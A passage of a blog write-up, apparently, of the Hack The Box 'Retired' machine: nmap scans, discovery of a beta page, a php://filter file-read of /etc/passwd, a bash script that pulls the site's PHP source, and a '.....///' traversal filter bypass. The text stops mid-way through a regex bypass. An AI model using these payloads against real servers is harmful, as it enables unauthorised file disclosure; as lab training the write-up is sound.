@@ -1,0 +1,1214 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Retired From Hack The Box - Medium Machine - 0xh41 | Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Retired HTB machine writeup" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Retired From Hack The Box - Medium Machine" />
+<meta property="og:description" content="Retired HTB machine writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hassan-al-achek.github.io/posts/retired-htb-machine/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-04-12T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Retired From Hack The Box - Medium Machine"/>
+<meta name="twitter:description" content="Retired HTB machine writeup"/>
+<script src="https://hassan-al-achek.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://hassan-al-achek.github.io/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://hassan-al-achek.github.io/css/main.dcdce5d0c876e01eff6576e36e0eaf7dac6d2941cbe7cd1770b52e1288fd3212.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://hassan-al-achek.github.io/css/dark.19b9457bc32f3649f4646b44ab3d6445ba73f43a15cd0763d01e18bc77eb5bbf.css"  disabled />
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://hassan-al-achek.github.io/">0xh41 | Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://hassan-al-achek.github.io/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Retired From Hack The Box - Medium Machine</h1>
+			<div class="meta">Posted on Apr 12, 2022</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			Exploiting buffer overflow vulnerability to again access to the machine
+		</div>
+
+		<section class="body">
+			<h1 id="recon">Recon:</h1>
+<h2 id="nmap-scan">Nmap Scan:</h2>
+<h3 id="quick-nmap-scan">Quick Nmap Scan:</h3>
+<ul>
+<li>Open Ports: 80 (http) - 22 (ssh)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ nmap 10.10.11.154
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-07 23:25 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.154
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.74 seconds
+</span></span></code></pre></div><h3 id="nmap-full-port-scan">Nmap Full Port Scan:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ nmap -p- 10.10.11.154
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-07 23:29 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.154
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 58.07 seconds
+</span></span></code></pre></div><h3 id="nmap-services-version-fingerprinting">Nmap Services Version Fingerprinting:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ nmap -p80,22 -sV -sC 10.10.11.154
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-07 23:34 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.154
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>| http-title: Agency - Start Bootstrap Theme
+</span></span><span style="display:flex;"><span>|_Requested resource was /index.php?page<span style="color:#f92672">=</span>default.html
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 10.32 seconds
+</span></span></code></pre></div><h3 id="recon-web-application---port-80-http">Recon: Web Application - Port: 80 (http)</h3>
+<ul>
+<li>
+<p><strong>Main Page</strong>:
+![[Pasted image 20221207233632.png]]</p>
+</li>
+<li>
+<p>Web Tech Stack:
+![[Pasted image 20221207233725.png]]</p>
+</li>
+<li>
+<p>Using wappalyzer firefox extension we can get intial idea about the web tech stack used:</p>
+<ul>
+<li>Back-end programming language: PHP</li>
+<li>Server: Nginx</li>
+</ul>
+</li>
+<li>
+<p><strong>Contact Us</strong>: - The form seems to not be submitted to the backend server:
+![[Pasted image 20221207234040.png]]</p>
+</li>
+<li>
+<p>Our Services:
+![[Pasted image 20221207234251.png]]</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>EMUEMU</strong>: Coming soon: The official software emulator for OSTRICH roms. We want to encourage a vibrant community and have made it our goal to provide an easily hackable software-only way to get started with the OSTRICH platform. This emulator should satisfy all you customization and development needs. (This is currently <strong>only open for <em>beta</em> testers</strong> who already purchased an OSTRICH)</p>
+</blockquote>
+<ul>
+<li>HTTP Get Parameter:
+<ul>
+<li>From the URL, We can detect a GET parameter submitted to the backend server: http://10.10.11.154/index.php?page=default.html</li>
+<li>The GET parameter <em>page</em>.</li>
+<li>The current value of the <em>page</em> query parameter is <em>default.html</em></li>
+<li>Based on the parameter name and value, we can conclude that the variable is used to load the main page website (<em>default.html</em>).</li>
+<li>The web applciaton load the page specified by the page parameter&rsquo;s value.</li>
+<li>We can test if the parameter is vulnerable to path traversal or if we can reveal a secret page.</li>
+</ul>
+</li>
+</ul>
+<h4 id="revealing-the-_betahtml_-page">Revealing the <em>beta.html</em> page:</h4>
+<ul>
+<li>This phrase catched my eyes: This is currently <strong>only open for <em>beta</em> testers</strong> who already purchased an OSTRICH</li>
+<li><strong>For beta testers</strong>: So i decided to tries beta.php or beta.html</li>
+</ul>
+<p>![[Pasted image 20221207235719.png]]</p>
+<ul>
+<li><em>beta.html</em>: revealed a new page with file upload functionality (New attack vector)</li>
+</ul>
+<blockquote>
+<p>Currently development for EMUEMU just started, but we have big plans. If you bought an OSTRICH console from us and want want to be part of the next step, you can enable your OSTRICH license for usage with EMUEMU via the activate_license application today for our upcoming beta testing program for EMUEMU. A license files contains a 512 bit key. That key is also in the QR code contained within the OSTRICH package. Thank you for participating in our beta testing program.
+Upload License Key File</p>
+</blockquote>
+<ul>
+<li>If we submit any file, it will be submitted to <code>activate_license.php</code></li>
+</ul>
+<p>![[Pasted image 20221208000157.png]]</p>
+<blockquote>
+<p><em>you can enable your OSTRICH license for usage with EMUEMU via the <strong>activate_license</strong> application today for our upcoming beta testing program for EMUEMU.</em></p>
+</blockquote>
+<p>![[Pasted image 20221208000400.png]]</p>
+<h3 id="getting-foothold">Getting FootHold:</h3>
+<ul>
+<li>
+<p>Attack Vector:</p>
+<ul>
+<li>http://10.10.11.154/index.php?page=default.html</li>
+<li><em>page</em> query parameter used to load web application content</li>
+<li>We can test if test parameter is vulnerable to path traversal and file inclusion vulnerability.</li>
+</ul>
+</li>
+<li>
+<p>Path traversal (According to chatGPT ;) )</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>A path traversal vulnerability is a type of vulnerability that occurs when a program constructs a file path using user-supplied input without properly sanitizing it. This can allow an attacker to access files outside of the intended directory by providing a file path that traverses outside of the directory. For example, if a program expects a file name as input and constructs a file path using the following code:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copy code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`char filepath[100]; sprintf(filepath, &#34;/var/www/files/%s&#34;, filename);`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>An attacker could provide the file name &#34;../../etc/passwd&#34; as input, which would result in the file path &#34;/var/www/files/../../etc/passwd&#34;. This file path traverses outside of the <span style="color:#e6db74">`/var/www/files`</span> directory and accesses the <span style="color:#e6db74">`/etc/passwd`</span> file, which contains the system&#39;s user accounts.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To prevent path traversal vulnerabilities, it is important to properly sanitize user-supplied input before using it to construct file paths. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copy code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`if (!is_alphanumeric(filename)) {   error(&#34;invalid file name&#34;); } char filepath[100]; sprintf(filepath, &#34;/var/www/files/%s&#34;, filename);`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This prevents an attacker from providing malicious input that can be used to traverse outside of the intended directory.
+</span></span></code></pre></div><ul>
+<li>File inclusion (According to chatGPT ;) )</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>A file inclusion vulnerability is a type of vulnerability that occurs when a program includes a file using user-supplied input without properly sanitizing it. This can allow an attacker to include arbitrary files on the server, potentially exposing sensitive information or allowing the attacker to execute arbitrary code.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For example, consider a PHP script that uses the following code to include a file specified by the <span style="color:#e6db74">`$page`</span> variable:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copy code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`include($page);`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>If an attacker can control the value of the <span style="color:#e6db74">`$page`</span> variable, they could provide a file path that includes a sensitive file on the server, such as the server&#39;s password file. For example, the attacker could provide the following value for <span style="color:#e6db74">`$page`</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copy code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`/etc/passwd`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This would cause the PHP script to include the <span style="color:#e6db74">`/etc/passwd`</span> file, exposing the server&#39;s user accounts to the attacker.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To prevent file inclusion vulnerabilities, it is important to properly sanitize user-supplied input before using it to include files. This can involve checking the input for malicious characters and patterns, and only allowing the use of certain characters in the input. For example, the above code could be modified to only allow alphanumeric characters in the file name as follows:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copy code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`if (!is_alphanumeric($page)) {   error(&#34;invalid file name&#34;); } include($page);`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This prevents an attacker from providing malicious input that can be used to include arbitrary files on the server.
+</span></span></code></pre></div><ul>
+<li>Using this simple php filter trick, i was able to get the content of /etc/passwd file:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl http://10.10.11.154/index.php?page<span style="color:#f92672">=</span>php://filter/resource<span style="color:#f92672">=</span>/etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>vagrant:x:1000:1000::/vagrant:/bin/bash
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>dev:x:1001:1001::/home/dev:/bin/bash
+</span></span></code></pre></div><ul>
+<li>Now I will create a simple bash script to automate the process of collecting <em>default.html, beta.html, activate_license.php, index.php</em> source code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ cat collectSourceCode.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check If Argument Available</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z $1 <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;[-] Usage: </span>$0<span style="color:#e6db74"> &lt;Remote_IP&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>        exit
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mahcine IP Address</span>
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">=</span>$1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check If Loot directory Already Exist</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -d loot <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;[+] Loot Directory Already Exists&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        mkdir loot
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;[+] Loot Directory Created&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Loot Files Will Be Saved To: &#34;</span> <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/loot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>files<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;default.html&#34;</span> <span style="color:#e6db74">&#34;beta.html&#34;</span> <span style="color:#e6db74">&#34;activate_license.php&#34;</span> <span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> f in <span style="color:#e6db74">${</span>files[@]<span style="color:#e6db74">}</span>;<span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;[+] Downloading: </span>$f<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        curl <span style="color:#e6db74">&#34;http://</span>$IP<span style="color:#e6db74">/index.php?page=php://filter/resource=</span>$f<span style="color:#e6db74">&#34;</span> -o loot/$f
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[~] Done, Bye :)&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ ./collectSourceCode.sh 10.10.11.154
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Loot Directory Created
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Loot Files Will Be Saved To:  /home/xh41/loot
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Downloading: default.html
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span> <span style="color:#ae81ff">11414</span>    <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">11414</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">84040</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">84548</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Downloading: beta.html
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">4144</span>    <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4144</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">44852</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:-- <span style="color:#ae81ff">45043</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Downloading: activate_license.php
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">585</span>    <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">585</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">3061</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  <span style="color:#ae81ff">3078</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Downloading: index.php
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">348</span>    <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">348</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">1814</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  <span style="color:#ae81ff">1821</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Done, Bye :<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Files Downloaded</span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ tree loot
+</span></span><span style="display:flex;"><span>loot
+</span></span><span style="display:flex;"><span>├── activate_license.php
+</span></span><span style="display:flex;"><span>├── beta.html
+</span></span><span style="display:flex;"><span>├── default.html
+</span></span><span style="display:flex;"><span>└── index.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> directories, <span style="color:#ae81ff">4</span> files
+</span></span></code></pre></div><ul>
+<li><em>Note:</em> the vulnerability we exploited is not a file inclusion vulnerability, it&rsquo;s a file read vuln <code>readfile</code></li>
+</ul>
+<h4 id="collected-files-analysis">Collected Files Analysis:</h4>
+<ul>
+<li><em>index.php</em>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sanitize_input</span>($param) {
+</span></span><span style="display:flex;"><span>    $param1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param);
+</span></span><span style="display:flex;"><span>    $param2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;./&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $param2;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$page <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;page&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($page) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/^[a-z]/&#34;</span>, $page)) {
+</span></span><span style="display:flex;"><span>    $page <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitize_input</span>($page);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /index.php?page=default.html&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">readfile</span>($page);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>By analysing <em>index.php</em>, i discoved that i bypassed the filter by incident :)</li>
+<li>sanitize_input($param) analysis: this function replace ./ and ../ with empty string. the following payload will bypasss this filter: <code>.....///.....///.....///.....///.....///etc/passwd</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php &gt; $param <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.....///.....///.....///.....///.....///etc/passwd&#39;</span>;
+</span></span><span style="display:flex;"><span>php &gt; $param1 <span style="color:#f92672">=</span> str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>php &gt; $param2 <span style="color:#f92672">=</span> str_replace<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$param1<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>php &gt; echo $param2;
+</span></span><span style="display:flex;"><span>../../../../../etc/passwd
+</span></span></code></pre></div><ul>
+<li>
+<p>The payload is not complete till now. We need to bypass this regex: <code>preg_match(&quot;/^[a-z]/&quot;, $page)</code>, this regex insists that the first chracter of the <code>$page</code> need to be a charcter from [a-z].</p>
+</li>
+<li>
